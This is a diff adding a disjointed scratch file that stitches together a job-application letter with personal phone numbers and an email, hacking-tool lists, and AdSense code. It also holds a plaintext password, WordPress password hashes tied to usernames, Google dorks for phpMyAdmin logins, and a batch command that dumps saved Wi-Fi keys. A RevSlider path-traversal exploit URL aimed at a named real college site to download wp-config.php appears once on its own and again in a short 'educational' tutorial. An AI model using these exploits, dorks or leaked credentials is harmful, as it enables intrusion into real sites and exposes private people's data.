@@ -1,0 +1,496 @@
+
+
+
+
+
+8489752920
+9789552173
+
+
+
+Hello Sir/Mam,
+I am S.Asartheen and I have completed my B.E Computer Science Engineering at National Engineering College(Kovilpatti).
+I am interested to work for your company and believe that I would be a better fit for the position.
+I am good in a programming language like c,java, as well as Network security and I completed my CCNA course during college days.
+I have enclosed an updated copy of my resume.
+You can email me or by phone at 8248300216
+Awaiting your response, 
+Thank you 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+$P$BzUtY9F1Xw9VPmEKO4ZBWb0FI0cZft0
+
+
+
+
+Azartheen@786
+
+
+
+: inurl:phpmyadmin/index.php & (intext:username & password & "Welcome to")
+
+
+
+
+
+inurl:phpmyadmin/index.php & (intext:username & password & "Welcome to")
+
+allintitle:"Index of /login" | inurl: "/phpmyadmin/"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+sumathip9797@gmail.com
+9597657743
+
+@echo off
+netsh wlan show profiles "wireless" key=clear > key
+
+
+http://nec.edu.in/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+
+@echo off
+netsh wlan show profiles "name" key=clear > key
+
+$P$BScIcXpsmENgK4Rj1fQcWiB34Hv8vU/
+
+
+
+
+
+Tools list you should know..
+
+Some lists
+
+1.Tamper Data
+2.Hack Bar
+3.Live HTTP headers
+4.User-Agent Switcher
+5.Flagfox
+6.Domain Details
+7.Cookie Manager+
+8.HttpFox
+9.XSS Me
+10.Fireforce
+11.Wappalyzer
+12.PassiveRecon
+13.Blur
+14.Poster
+15.NoScript
+16.CSRF Finder
+17.Copy As Plain Text
+18.FoxyProxy Standard
+19.RightClickXSS
+20.Export/import cookies
+21.Firebug
+22.CryptoFox
+23.NoRedirect
+24.Ghostery
+25.Privacy Badger
+26.Disconnect
+27.Adblock Plus
+28.Hoxx VPN
+@free_open_source_knowledge
+#Maps
+????.
+1.Network Plus
+2.CEH
+3.Linux Commands
+4.Cmd Commands
+5.Kali Linux Tools
+6.Windows Tools
+7.Learning Bugs
+8.Learning Python
+9.Learning Ruby
+#Tools
+????.
+1.DDoS
+2.Forensics
+3.Programming
+4.Exploitation
+5.Phone Hacking
+6.Server Hacking
+7.Client Hacking
+8.Website Hacking
+9.Network Hacking
+10.Wireless Hacking
+11.Reverse Engeenering
+12.Information Gathering
+
+#DDoS
+1.MDK3
+2.LOIC
+3.HULK
+4.DDOSIM
+5.Ufonet
+6.Hping3
+7.Xerxes
+8.Hammer
+9.Slowloris
+10.Websploit
+11.GoldenEye
+12.Metasploit
+13.Aireplay-ng
+14.Slowhttptest
+
+#Forensics
+1.COFEE
+2.Volafox
+3.Autopsy
+4.Foremost
+5.Hashdeep
+6.Binwalk
+
+#Programming
+1.Notepad++
+2.Visual Studio
+3.Text Editor
+
+#Exploitation
+1.Metasploit
+2.Sqlmap
+3.Core Imact
+4.W3af
+5.BeEF
+6.Dradis
+
+#Phone Hacking
+1.Metasploit
+2.Apktool
+3.Droidjack
+4.AndroRAT
+5.Spynote
+
+#Server Hacking
+1.SQLmap
+2.Jsql
+3.Havij
+4.Hydra
+5.Metasploit
+6.Armitage
+7.Brupsuite
+8.Owasp-ZAP
+9.Netsparker
+10.Acunetix
+11.OpenVAS
+
+#Client Hacking
+1.Darkcomet
+2.FatRat
+3.Veil-Evasion
+4.Shallter
+5.Unicorn
+6.Setoolkit
+7.Armitage
+8.BeEF-Framework
+9.EmPyre
+10.FakeImageExploiter
+11.Pupy
+12.DFU-Programmer
+13.Cobalt Strike
+14.Exploitpack
+15.Gcat
+16.Crowbar
+
+#Website Hacking
+1.Sn1per
+2.Owasp-ZAP
+3.Brupsuite
+4.Netsparker
+5.Acunetix
+6.SQLmap
+7.Xsser
+8.WPScan
+9.Joomrra
+10.Joomscan
+11.WPSeku
+12.XSStrike
+13.Kadimus
+14.jexboss
+15.CMSmap
+16.brut3k1t
+17.0d1n
+18.CloudFail
+19.Arachni
+20.Nikto
+21.Webscarab
+22.Nmap
+23.Vbscan
+24.Sentry MBA
+
+#Network Hacking
+1.MITMf
+2.Bettercap
+3.Ettercap
+4.Tcpdump
+5.Wireshark
+6.Driftnet
+7.SSLstrip
+8.Armitage
+9.Metasploit
+10.Xerosploit
+11.Sparta
+12.Hydra
+
+#Wireless Hacking
+1.Wifite
+2.Airodump-ng
+3.Aireplay-ng
+4.Wash
+5.WiFi Pumpkin
+6.Wifiphisher
+7.Fluxion
+8.Infernal Twin
+9.WPSpin
+
+#Reverse Engeenering
+1.OWASP-ZSC
+2.OllyDBG
+3.Apktool
+
+@free_open_source_knowledge
+#Methods? ????.
+1.DDoS
+2.Forensics
+3.Programming
+4.Exploitation
+5.Phone Hacking
+6.Server Hacking
+7.Client Hacking
+8.Website Hacking
+9.Network Hacking
+10.Wireless Hacking
+11.Reverse Engeenering
+12.Information Gathering
+@free_open_source_knowledge
+
+#DDoS
+1.Nuke
+2.Botnet
+3.Zero Day
+4.Slowloris
+5.SYN Flood
+6.Reflected
+7.Multi Vector
+8.Peer to Peer
+9.Ping of Death
+10.Protocol Flood
+11.Application Level
+
+#Forensics
+1.History
+2.Etymology
+3.Maturation
+4.Toxicology
+5.References
+6.Bibliography
+7.Fingerprints
+8.Anthropometry
+
+#Programming
+1.C
+2.PHP
+3.ASP
+4.Ruby
+5.Bash
+6.Perl
+7.Python
+8.Assembly
+9.JavaScript
+
+#Exploitation
+1.RCE
+2.BOF
+3.POC
+4.SQL Injection
+5.Code Execution
+6.Command Injection
+7.Abritrary Library
+
+#Phone Hacking
+1.BOF
+2.RCE
+3.DOS
+4.Bind RAT
+
+#Server Hacking
+1.BOF
+2.RCE
+3.SSRF
+4.Zero Day
+5.Privilage
+6.Bruteforce
+7.Upload Shell
+8.SQL Injection
+@learntocrack
+#Client Hacking
+1.RAT
+2.BOF
+3.RCE
+4.Virus
+5.Binder
+6.Cryption
+7.Phishing
+8.Backdoor
+9.Keylogger
+10.Privilage
+11.Bruteforce
+12.Steal Passwords
+13.Social Engeenering
+
+#Website Hacking
+1.DOS
+2.XSS
+3.RCE
+4.XXE
+5.CSRF
+6.SSRF
+7.LFI/RFI
+8.Cracking
+9.Bruteforce
+10.Upload Shell
+11.SQL Injection
+12.Google Hacking
+13.Xpath Injection
+
+#Network Hacking
+1.BOF
+2.RCE
+3.VoIP
+4.MITM
+5.Spoof
+6.Sniff
+7.Bruteforce
+8.Cupture Packet
+@free_open_source_knowledge
+#Wireless Hacking
+1.WPSpin
+2.FakeAP
+3.Eviltwin
+4.Handshake
+
+#Reverse Engeenering
+1.Compiler
+2.Shellcode
+3.App Cracking
+4.Serial Cracking
+5.Decompile Softwares
+
+#Information Gathering
+1.Enum
+2.Recon
+3.Whois
+4.Email Contact
+5.Phone Contact
+6.Service Status
+7.Protocol Analysis
+
+____________________________________________________________________________________________________________________________________________________________________
+
+
+
+
+
+
+
+
+http://103.84.178.41/onlinefee/PaymentResult.aspx?app=18981&cC=13&stat=success&Id=57221&PG=IOB&mihpayid=57220&amt=2314
+
+//Insert ads after second paragraph of single post content.
+
+add_filter( ‘the_content’, ‘prefix_insert_post_ads’ );
+
+function prefix_insert_post_ads( $content ) {
+$ad_code = ‘<div class=”ads”>Ads<script async src=”//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js”></script>
+<!– post1 –>
+<ins class=”adsbygoogle”
+style=”display:block”
+data-ad-client=”ca-pub-8557232931479259?
+data-ad-slot=”9046667321?
+data-ad-format=”auto”></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>';
+
+if ( is_single() && ! is_admin() ) {
+
+return prefix_insert_after_paragraph( $ad_code, 3, $content );
+}
+return $content;
+}
+
+
+
+
+$P$BXQzf2sZyNMdipTGnvDll26UgHF9OI.
+
+
+
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-7918426196681056",
+    enable_page_level_ads: true
+  });
+</script>
+
+
+wpengine
+$P$BjGlUpBVrSgLeX/8EtRRh90UwiBsRh1
+
+
+
+necedu
+$P$Bp32IgSSsIwRKY9E2TkDA3q/v/77Jo0
+
+
+necadmin
+$P$BScIcXpsmENgK4Rj1fQcWiB34Hv8vU/
+
+	
+solai
+$P$BXQzf2sZyNMdipTGnvDll26UgHF9OI.
+solai
+
+
+This is Tutorial for Hacking Wordpress Site by config file .Its i did with Kali Linux , But its also can done with windows. With this method you can easily download wp-config.php files from these wordpress sites. This vulnerability is file download vulnerability . And with this exploit you can download config files from these types of website . And the config file is , wp-config.php , this is the main file which connected with wordpress database .
+
+I also give here the dork and exploit for use yourself .
+
+But Remember , these things are only for educational purpose , please never do any bad use.
+
+Dork : inurl:/wp-content/plugins/revslider/
+
+Exploit : /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
